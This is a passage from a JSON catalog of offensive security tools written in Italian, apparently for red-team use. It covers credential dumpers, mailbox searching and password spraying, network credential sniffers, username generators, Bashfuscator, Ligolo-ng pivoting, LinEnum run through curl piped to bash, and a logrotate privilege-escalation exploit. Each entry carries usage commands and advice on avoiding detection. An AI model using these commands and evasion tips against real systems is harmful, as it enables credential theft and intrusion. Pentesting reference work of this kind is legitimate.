wifi</code></pre><p>Su Linux/Mac: <code>python3 laZagne.py all</code>. I risultati vengono stampati a video e possono essere salvati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong> su una workstation compromessa, LaZagne è spesso il passo più veloce per ottenere credenziali per muoversi lateralmente (es. password di root del database salvata in un client SQL, o chiave SSH privata non protetta da passphrase). Essenziale per dimostrare il rischio del salvataggio password nei browser.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La maggior parte degli antivirus ed EDR rileva LaZagne basandosi sulla firma dell'eseguibile o sul comportamento (accesso massivo a file di configurazione browser/mail). L'uso della DPAPI genera eventi di sistema.</p><p><strong>Mitigazioni:</strong> Non usare l'EXE standard. Eseguire tramite Python se presente sul target, o ricompilare/offuscare il codice. Eseguire solo moduli specifici necessari per ridurre il rumore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "mailsniper",
    "name": "MailSniper",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dafthack/MailSniper",
    "desc": "Toolkit PowerShell per cercare dati sensibili nelle caselle di posta Exchange/O365, eseguire password spraying e testare injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MailSniper è uno strumento offensivo dedicato agli ambienti Microsoft Exchange e Office 365. È progettato per due scopi principali: la ricerca di dati sensibili (termini come \"password\", \"credenziali\", \"fattura\") all'interno delle email di un'organizzazione e l'esecuzione di attacchi di password spraying contro OWA (Outlook Web Access) e EWS (Exchange Web Services). È potente per trasformare un singolo account email compromesso in una compromissione di dati massiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Global Address List (GAL) Dumping:</strong> Scarica l'elenco completo degli indirizzi email dell'azienda per creare liste target precise per attacchi successivi.</p><p><strong>Keyword Search (Self & Delegate):</strong> Cerca termini specifici nella casella di posta dell'utente corrente e in tutte le caselle su cui l'utente ha permessi di delega. Utile per trovare VPN config, password inviate via mail o dati finanziari.</p><p><strong>Password Spraying OWA/EWS:</strong> Esegue attacchi di brute-force distribuito (spraying) contro i portali web di posta, supportando la rotazione degli host e il controllo dei tempi per evitare il blocco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Importare il modulo PowerShell.</p><pre><code># Ricerca termini sensibili nella mailbox corrente\nInvoke-SelfSearch -MailboxUser user@domain.com\n\n# Password Spraying contro OWA\nInvoke-PasswordSprayOWA -Url https://mail.corp.com/owa -UserList users.txt -Password \"Estate2024!\"\n\n# Ricerca su tutte le mailbox (Richiede Admin Exchange)\nInvoke-GlobalMailSearch -ImpersonationUser Admin -ExchHostname mail.corp.com -Terms \"password\",\"secret\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In uno scenario di <strong>Internal Threat</strong> o <strong>Compromised User</strong>, MailSniper automatizza la ricerca di informazioni sfruttabili tra migliaia di email storiche. Il password spraying su OWA è spesso l'unico vettore disponibile dall'esterno se la VPN richiede certificati o MFA (anche se OWA dovrebbe avere MFA).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo spraying su OWA genera molti log di accesso fallito (IIS logs, Event logs). La ricerca massiva via EWS genera traffico anomalo e carico sul server Exchange.</p><p><strong>Mitigazioni:</strong> Usare l'opzione <code>-Sleep</code> per rallentare le richieste. Per la ricerca, limitarsi a mailbox chiave o termini specifici per ridurre il tempo di connessione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "net-creds",
    "name": "net-creds",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/DanMcInerney/net-creds",
    "desc": "Script Python per sniffing passivo di credenziali e hash (HTTP, FTP, NTLM, Kerberos, ecc.) da interfaccia di rete o pcap.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Net-Creds è uno sniffer leggero focalizzato esclusivamente sull'estrazione di dati sensibili dal traffico di rete. Analizza i pacchetti in transito per identificare stringhe di autenticazione in chiaro (Basic Auth, FTP, POP3) o challenge crittografici (NTLM, Kerberos, SNMP). È progettato per essere eseguito silenziosamente su una macchina compromessa o durante un Man-in-the-Middle.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Parsing:</strong> Riconosce automaticamente i protocolli e formatta l'output mostrando IP sorgente, destinazione, username e password/hash.</p><p><strong>Pcap Support:</strong> Può analizzare file di cattura registrati precedentemente, utile per analisi forense offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede privilegi root per l'accesso raw socket.</p><pre><code># Sniffing live su interfaccia\nsudo python2 net-creds.py -i eth0\n\n# Lettura da file pcap\npython2 net-creds.py -p capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation:</strong> Lasciato in esecuzione su un server file o un gateway compromesso, raccoglie le credenziali di chiunque vi acceda. Utile per verificare se applicazioni interne usano ancora HTTP o FTP non cifrato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Modalità promiscua della NIC può essere rilevata localmente. Nessun traffico generato in rete (passivo).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "pcredz",
    "name": "PCredz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/lgandx/PCredz",
    "desc": "Sniffer passivo che estrae credenziali (NTLM, HTTP Basic, FTP, POP3, SMTP, SNMP) e hash dal traffico di rete o file pcap.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PCredz è uno strumento di Network Forensics e Credential Harvesting passivo. Analizza il traffico di rete in tempo reale (o file .pcap registrati) per identificare pattern di autenticazione e estrarre credenziali in chiaro o hash. A differenza di Responder (che è attivo/poisoner), PCredz si limita ad ascoltare silenziosamente, rendendolo molto difficile da rilevare.</p><br><hr><h4 class=\"rt-purple\">Protocolli supportati</h4><p><strong>Cleartext:</strong> Cattura credenziali HTTP Basic, FTP, POP3, IMAP, SMTP, Telnet e SNMP community strings (v1/v2).</p><p><strong>Hash/Challenge:</strong> Estrae hash NTLMv1/v2 (da HTTP/SMB/LDAP) e Kerberos hashes, formattandoli automaticamente per essere passati a Hashcat o John the Ripper.</p><p><strong>Credit Cards:</strong> Include regex per identificare numeri di carte di credito che transitano in chiaro (raro ma possibile in reti legacy).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede permessi di root per mettere l'interfaccia in modalità promiscua.</p><pre><code># Ascolto live sull'interfaccia eth0\n./Pcredz -i eth0\n\n# Analisi di un file pcap catturato precedentemente\n./Pcredz -f capture.pcap</code></pre><p>Le credenziali catturate vengono salvate nel file <code>CredentialDump-Session.log</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In uno scenario di <strong>Internal Network Assessment</strong>, lasciare PCredz in esecuzione su un dispositivo compromesso (o Raspberry Pi \"dropbox\") per qualche ora può raccogliere credenziali di amministratori che si collegano a servizi legacy. Ottimo per validare se il traffico sensibile è cifrato (SSL/TLS) o meno.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Passivo e invisibile sulla rete. Tuttavia, mettere la scheda di rete in modalità promiscua può essere rilevato localmente dall'OS o da tool di monitoraggio hardware.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Credentials_Hunting"
    ],
    "notes": null
  },
  {
    "id": "credking",
    "name": "CredKing",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ustayready/CredKing",
    "desc": "Framework di password spraying che utilizza AWS Lambda (FireProx) per rotazione IP e evasione intelligente del blocco account.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CredKing porta il password spraying a un livello superiore integrando tecniche di evasione IP avanzate. Utilizza AWS API Gateway e Lambda (tramite FireProx) per ruotare l'indirizzo IP sorgente ad ogni richiesta, rendendo inutile il blocco IP da parte dei difensori. Supporta plugin per target multipli come Office 365, Okta, Gmail e SMB, gestendo automaticamente le finestre di lockout.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP Rotation (FireProx):</strong> La caratteristica distintiva. Invece di attaccare dal tuo IP (che verrebbe bannato), CredKing lancia le richieste attraverso infrastruttura cloud effimera, apparendo come traffico legittimo AWS diverso ad ogni tentativo.</p><p><strong>Plugin Modulari:</strong> Architettura estensibile per aggiungere nuovi target di login (es. portali VPN proprietari, app web custom).</p><p><strong>Smart Spraying:</strong> Algoritmi per distribuire i tentativi nel tempo e tra gli utenti, minimizzando la probabilità di triggerare soglie di allarme comportamentale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede configurazione AWS e credenziali. Esecuzione via Python.</p><pre><code># Spraying su O365 con rotazione IP\npython3 credking.py --plugin o365 --userfile users.txt --password \"Password123!\" --threads 5\n\n# Spraying su Okta\npython3 credking.py --plugin okta --target https://corp.okta.com --userfile users.txt --password \"Welcome1\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Indispensabile per <strong>Red Teaming</strong> contro target maturi che implementano Geo-blocking o IP-based rate limiting. Quando un attacco Hydra standard fallisce dopo 3 tentativi per ban IP, CredKing continua imperterrito. Efficace per testare la robustezza delle policy di password esterne.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene l'IP cambi, il pattern di \"molti login falliti su molti account\" è comunque visibile nei log applicativi del target. L'User-Agent potrebbe necessitare di tuning.</p><p><strong>Impatto operativo:</strong> Basso rischio tecnico, ma alto rischio di rilevamento procedurale.</p><p><strong>Mitigazioni:</strong> Usare password molto comuni per massimizzare il successo al primo tentativo. Monitorare attentamente le risposte per fermarsi se il target implementa CAPTCHA.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "decrypt-chrome-passwords-main",
    "name": "decrypt-chrome-passwords",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ohyicong/decrypt-chrome-passwords",
    "desc": "Tool specializzato per estrarre e decifrare credenziali salvate nel database SQLite di Google Chrome (Login Data) via DPAPI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questo strumento si focalizza specificamente sul browser Google Chrome (e derivati Chromium). Automatizza il processo di localizzazione del file <code>Login Data</code>, estrazione della chiave di crittografia (memorizzata in <code>Local State</code> e protetta da DPAPI utente) e decifratura delle password. È una versione più mirata e leggera rispetto a suite complete come LaZagne.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Estrazione Master Key:</strong> Recupera la chiave master di Chrome decifrandola tramite le API di Windows (CryptUnprotectData), necessaria per le versioni recenti del browser (v80+).</p><p><strong>Parsing SQLite:</strong> Legge il database locale di Chrome, estraendo URL, username e blob cifrati delle password, gestendo le differenze di schema tra versioni.</p><p><strong>Output Pulito:</strong> Fornisce le credenziali in chiaro pronte per essere usate o esfiltrate.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script (Python o EXE) sulla macchina target con l'utente vittima loggato.</p><pre><code># Esecuzione standard\npython3 decrypt_chrome.py\n\n# Output su CSV\npython3 decrypt_chrome.py --output credentials.csv</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilissimo in script di <strong>Automated Post-Exploitation</strong> (es. via USB Rubber Ducky o payload in memoria) per rubare rapidamente accessi web senza dipendenze pesanti. Le credenziali web spesso aprono porte a portali cloud, mail o accessi VPN aziendali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Accesso al file <code>Login Data</code> mentre Chrome è aperto potrebbe fallire (file lock) o generare errori. L'uso di API crittografiche di sistema è monitorabile.</p><p><strong>Mitigazioni:</strong> Copiare i file del database in una temp folder prima di leggerli per evitare lock e ridurre tracce di accesso diretto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "htb-wordlist",
    "name": "HTB-wordlist",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Wordlist curata specificamente per le challenge HackTheBox: directory, file e credenziali ricorrenti nei lab CTF.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>HTB-wordlist non è un singolo file ma una selezione di dizionari che la community di HackTheBox ha identificato come \"must-have\" per risolvere le macchine della piattaforma. Contiene percorsi web, nomi di file e password che appaiono frequentemente nei laboratori CTF, ottimizzando i tempi di bruteforce rispetto a liste enormi come `directory-list-2.3-medium`.</p><br><hr><h4 class=\"rt-purple\">Caratteristiche</h4><p><strong>Contesto CTF:</strong> Le liste sono pulite da entry inutili per ambienti simulati e arricchite con termini \"troll\" o specifici che i creatori di challenge amano usare.</p><p><strong>Efficienza:</strong> Progettate per dare risultati veloci (Hit rate alto) su macchine vulnerabili intenzionalmente, riducendo il tempo di scansione con Gobuster o Feroxbuster.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Da usare come primo step nelle challenge HTB.</p><pre><code># Directory busting su macchina HTB\ngobuster dir -u http://10.10.10.x -w htb-directories.txt\n\n# Fuzzing vhost\nffuf -u http://10.10.10.x -H \"Host: FUZZ.box.htb\" -w htb-subdomains.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Esclusivamente per <strong>CTF e Training</strong>. In un pentest reale, queste liste potrebbero essere troppo limitate o specifiche (\"CTF-isms\") e mancare di copertura per software enterprise reali.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Non affidarsi solo a queste per assessment reali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "omnispray",
    "name": "Omnispray",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/0xZDH/Omnispray",
    "desc": "Tool modulare per password spraying con gestione avanzata di target multipli, delay randomizzato e output strutturato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Omnispray è un framework progettato per semplificare e rendere più sicuro il password spraying su larga scala. A differenza di script one-off, offre una gestione centralizzata dei target e delle credenziali testate, con funzionalità robuste per evitare lockout e rilevamento.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Safety Controls:</strong> Implementa jitter (ritardi casuali) tra le richieste e stop automatici in caso di troppi errori consecutivi, per mimetizzarsi nel traffico normale.</p><p><strong>Target multipli:</strong> Può attaccare simultaneamente diversi servizi (O365, OWA, VPN, SSH) usando moduli specifici, riutilizzando la stessa lista utenti.</p><p><strong>Reporting:</strong> Genera log puliti e file CSV con le credenziali valide, pronti per la fase successiva.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Configurare il target e lanciare lo spray.</p><pre><code># Spraying base su OWA\npython3 omnispray.py --module owa --target https://mail.corp.com --users users.txt --password \"Fall2024!\"\n\n# Spraying con delay elevato (stealth)\npython3 omnispray.py --module ssh --target 192.168.1.0/24 --users users.txt --password \"Password123\" --delay 30-60</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>External Recon:</strong> Testare le difese perimetrali (VPN, Webmail) con una singola password comune senza rischiare di bloccare l'intera azienda.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Anche con delay, il volume di login falliti da un singolo IP è sospetto. Usare in combinazione con proxy rotation (es. FireProx) se supportato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "statistically-likely-usernames",
    "name": "statistically-likely-usernames",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/insidetrust/statistically-likely-usernames",
    "desc": "Generatore di wordlist username basato su dati di censimento e pattern aziendali (nome.cognome, iniziali) per password spraying efficace.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Non è un software, ma una risorsa/metodologia per generare liste di username ad alta probabilità. Sfrutta dataset pubblici (nomi e cognomi più diffusi per nazionalità) e li combina con formati username standard (es. <code>m.rossi</code>, <code>mario.rossi</code>, <code>rossim</code>). Questo approccio statistico aumenta drasticamente il successo del password spraying e dell'enumerazione utenti riducendo il numero di richieste inutili verso account inesistenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dataset Reali:</strong> Include liste di nomi maschili/femminili e cognomi basati su dati di censimento USA, UK, e altri paesi, ordinati per frequenza.</p><p><strong>Pattern Generation:</strong> Script o logiche per permutare nomi e cognomi nei formati più usati dalle aziende (jsmith, john.s, smithj, ecc.).</p><p><strong>Efficienza:</strong> Permette di colpire il \"top 5%\" degli utenti probabili (es. i 100 cognomi più comuni coprono una grossa fetta della popolazione), ottimizzando il tempo di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si usa offline per preparare la lista target prima dell'attacco.</p><pre><code># Generazione lista username (esempio concettuale con tool di supporto)\n./generate-usernames.sh --format first.last --top 1000 > targets.txt\n\n# Uso con Kerbrute\nkerbrute userenum -d domain.local targets.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale in fasi di <strong>Recon Black-Box</strong> esterna quando non si hanno liste dipendenti. Combinato con LinkedIn scraping (per trovare i nomi reali), questo tool aiuta a indovinare il formato username aziendale (es. testando 10 dipendenti noti) e poi generare una lista massiva per l'intera azienda.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'accuratezza dipende dalla nazionalità del target. Usare liste anglosassoni su un'azienda italiana produrrà risultati scarsi. Necessita di localizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "username-anarchy-0-6",
    "name": "username-anarchy",
    "version": "0.6",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/urbanadventurer/username-anarchy",
    "desc": "Tool per generare liste di username basate su nomi reali, permutando formati comuni (j.doe, doe.j) per attacchi mirati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Username Anarchy risolve il problema di indovinare il formato degli username aziendali. Partendo da una lista di nomi e cognomi reali (es. ottenuta da LinkedIn), genera tutte le possibili permutazioni standard utilizzate dalle aziende (flast, first.last, f.last, ecc.). È essenziale per preparare liste di alta qualità per password spraying o phishing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Smart Permutation:</strong> Supporta decine di formati (Facebook style, Corporate standard) e sostituzioni (es. 'ø' -> 'o').</p><p><strong>Format Recognition:</strong> Se fornito di alcuni username noti, può tentare di dedurre il formato usato dall'azienda e generare gli altri di conseguenza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>CLI Ruby.</p><pre><code># Generazione massiva da lista nomi\n./username-anarchy -i fullnames.txt > userlist.txt\n\n# Generazione formato specifico (es. j.doe)\n./username-anarchy -f first.last Mario Rossi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Recon & Spraying:</strong> Per trasformare i dati OSINT (nomi dipendenti) in dati operativi (username validi) prima di lanciare un attacco Kerbrute o O365 spray.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Tool offline, nessun impatto OPSEC diretto. L'accuratezza della lista generata riduce il rumore degli attacchi successivi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Passwords_Cracking"
    ],
    "notes": null
  },
  {
    "id": "bashfuscator",
    "name": "Bashfuscator",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Bashfuscator/Bashfuscator",
    "desc": "Framework avanzato per offuscare script Bash rendendoli illeggibili e bypassando rilevamenti statici/signature-based.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bashfuscator è uno strumento potente per rendere incomprensibili gli script Bash e i payload Linux. Utilizza varie tecniche di manipolazione delle stringhe, encoding e logiche contorte per generare script funzionalmente identici all'originale ma completamente diversi nella forma, bypassando analisi statiche e filtri IDS che cercano keyword specifiche (es. <code>wget</code>, <code>nc -e</code>).</p><br><hr><h4 class=\"rt-purple\">Tecniche di offuscamento</h4><p><strong>Layering:</strong> Applica molteplici strati di offuscamento (es. Base64 -> AES -> XOR -> Reverse) che vengono decifrati a runtime dallo script stesso.</p><p><strong>Token Manipulation:</strong> Spezza i comandi in pezzi e usa variabili randomiche per ricostruirli (es. <code>c=\"l\"; a=\"s\"; $a$c -la</code>).</p><p><strong>Polimorfismo:</strong> Genera un output diverso ogni volta che viene eseguito, rendendo inutile la creazione di firme hash statiche.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Passare lo script o il comando da offuscare.</p><pre><code># Offuscamento di un one-liner\n./bashfuscator -c \"cat /etc/passwd\" -o payload.sh\n\n# Offuscamento di uno script file con 2 layer random\n./bashfuscator -f reverse_shell.sh -l 2 --choose-mutators random</code></pre><p>L'output è uno script bash pronto da eseguire sul target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Teaming</strong>, è vitale per bypassare controlli di sicurezza che ispezionano script caricati o comandi eseguiti (es. auditd logs, EDR Linux). Utile per nascondere la logica di un payload di persistenza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Gli script offuscati hanno spesso un'entropia molto alta o usano costrutti <code>eval</code> sospetti che i moderni EDR possono flaggare euristicamente come \"obfuscated script\". Testare sempre in lab.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng",
    "name": "Ligolo-ng",
    "version": "0.8.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/nicocha30/ligolo-ng",
    "desc": "Tool di tunneling/pivoting moderno che usa interfacce TUN per routing completo (TCP/UDP/ICMP) senza bisogno di SOCKS proxy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ligolo-ng rappresenta l'evoluzione del pivoting. A differenza dei tradizionali proxy SOCKS (come Chisel o SSH -D) che gestiscono solo connessioni TCP e richiedono \"proxychains\", Ligolo-ng crea un'interfaccia di rete virtuale (TUN) sulla macchina dell'attaccante. Questo permette di instradare <strong>tutto</strong> il traffico di rete (inclusi SYN scan, UDP, ICMP ping) verso la rete interna compromessa in modo trasparente, come se si fosse collegati in VPN.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full VPN-like Experience:</strong> Permette di usare tool come Nmap (con OS detection), Masscan o Kerberos tools senza wrapper o configurazioni proxy complesse.</p><p><strong>User-Space Execution:</strong> L'agent sul target gira in user-space (non richiede driver o privilegi amministrativi per funzionare, anche se privilegiati servono per alcune feature di rete avanzate).</p><p><strong>Reverse Tunneling:</strong> L'agent si connette al proxy dell'attaccante, bypassando firewall che bloccano connessioni in ingresso (bind shells).</p><p><strong>Certificati Let's Encrypt:</strong> Supporta gestione automatica certificati SSL per cifrare il traffico del tunnel e mascherarlo come HTTPS legittimo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Setup: Proxy sulla macchina attaccante, Agent sulla vittima.</p><pre><code># Attaccante (Setup interfaccia e listener)\nsudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert\n\n# Vittima (Connect back)\n./agent -connect attacker_ip:11601 -ignore-cert\n\n# Attaccante (Nella console ligolo)\nsession 1\nstart\n# Aggiunta rotta sul sistema attaccante\nsudo ip route add 192.168.50.0/24 dev ligolo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Standard de facto per <strong>Deep Network Pivoting</strong>. Se comprometti un server web esposto e vuoi scansionare la rete interna database con Nmap <code>-sS</code> (SYN scan) o eseguire attacchi UDP (es. Kerberoasting, SNMP), Ligolo-ng è superiore a qualsiasi proxy SOCKS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico è cifrato (TLS), ma una connessione persistente a lungo termine verso un IP esterno è sospetta (Beaconing). L'agent in memoria è un eseguibile Go che può essere firmato da EDR.</p><p><strong>Mitigazioni:</strong> Usare redirector https legittimi davanti al proxy. Rinominare l'agent.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "linenum",
    "name": "LinEnum",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/rebootuser/LinEnum",
    "desc": "Script Bash per privilege escalation enumeration su Linux: verifica kernel, SUID/GUID, cron jobs, config files e permessi errati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>LinEnum è uno dei primi e più diffusi script di enumerazione automatica per sistemi Linux. Esegue una batteria di oltre 60 controlli per identificare vettori comuni di escalation dei privilegi locali. È progettato per essere eseguito \"senza installazione\" (basta lo script bash) e fornisce un report dettagliato evidenziando (in giallo/rosso/magenta) le configurazioni più promettenti per ottenere root.</p><br><hr><h4 class=\"rt-purple\">Controlli principali</h4><p><strong>Kernel & Distribution:</strong> Identifica versione OS e Kernel per cercare exploit locali noti (es. DirtyCow).</p><p><strong>Permessi & Capabilities:</strong> Cerca file con bit SUID/SGID attivi, file scrivibili da \"world\" o gruppo, e capabilities POSIX anomale assegnate a eseguibili.</p><p><strong>Servizi & Job:</strong> Enumera processi girano come root, cron job (task pianificati) leggibili o modificabili, e timer di systemd.</p><p><strong>Credenziali:</strong> Cerca password in chiaro in file di config, history della shell, chiavi SSH e file <code>.plan</code>.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Copiare lo script sul target ed eseguirlo. Non richiede privilegi root.</p><pre><code># Esecuzione base con output a video\n./LinEnum.sh\n\n# Esecuzione approfondita (keyword search, test extra) e output file\n./LinEnum.sh -k password -e /tmp/ -t -r report.txt\n\n# Esecuzione memory-only (via curl)\ncurl -L https://raw.githubusercontent.com/.../LinEnum.sh | bash</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il primo step dopo aver ottenuto una shell <strong>Low Privilege</strong> su Linux. Risolve il problema del \"non so cosa cercare\", fornendo in pochi secondi una lista di potenziali vulnerabilità (es. un binario SUID di <code>nmap</code> vecchio, o un cron job che esegue uno script scrivibile dal tuo utente).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> LinEnum tocca migliaia di file in pochi secondi (scan filesystem). Questo genera un picco di I/O e accessi (atime updates) estremamente rumoroso. I comandi eseguiti finiscono nell'audit log.</p><p><strong>Mitigazioni:</strong> In ambienti monitorati, eseguire controlli manuali mirati invece dello script completo. Usare la redirezione output su <code>/dev/shm</code> (RAM disk) per evitare scritture su disco fisico.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "logrotten-2-1",
    "name": "logrotten",
    "version": "2.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/whotwagner/logrotten",
    "desc": "Exploit PoC per race condition in logrotate che permette Privilege Escalation da utente log a root.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>logrotten è un exploit che sfrutta una vulnerabilità di Race Condition nel tool di sistema <code>logrotate</code>. Se logrotate è configurato per gestire log in directory controllate dall'utente (o scrivibili), l'exploit permette di sostituire il file di log con un symlink o un payload maligno nell'istante esatto in cui logrotate esegue le operazioni, ottenendo esecuzione di codice come root.</p><br><hr><h4 class=\"rt-purple\">Meccanismo</h4><p><strong>Race Condition:</strong> Monitora il file di log target. Quando logrotate inizia a rinominare/comprimere il file, logrotten scambia il file con un symlink a una directory sensibile (es. <code>/etc/bash_completion.d/</code>).</p><p><strong>Payload Injection:</strong> Se la race condition vince, logrotate scrive o sposta il payload dell'attaccante nella directory di sistema, che verrà poi eseguito da root o da altri utenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede compilazione del binario C sul target.</p><pre><code># Compilazione\ngcc logrotten.c -o logrotten\n\n# Esecuzione (richiede un file di log vulnerabile)\n./logrotten -p ./payload.sh /tmp/vulnerable.log</code></pre><p>Spesso richiede di forzare la rotazione dei log o attendere il cron job giornaliero.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Specifico per <strong>Linux Privilege Escalation</strong>. Utile quando si ha accesso come utente di servizio (es. <code>www-data</code> o <code>mysql</code>) che ha permessi di scrittura sui propri log, e logrotate gira come root.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione dell'exploit può fallire più volte, lasciando tracce di file corrotti o symlink anomali. È un attacco attivo e rischioso.</p><br><hr>",
    "best_in": false,
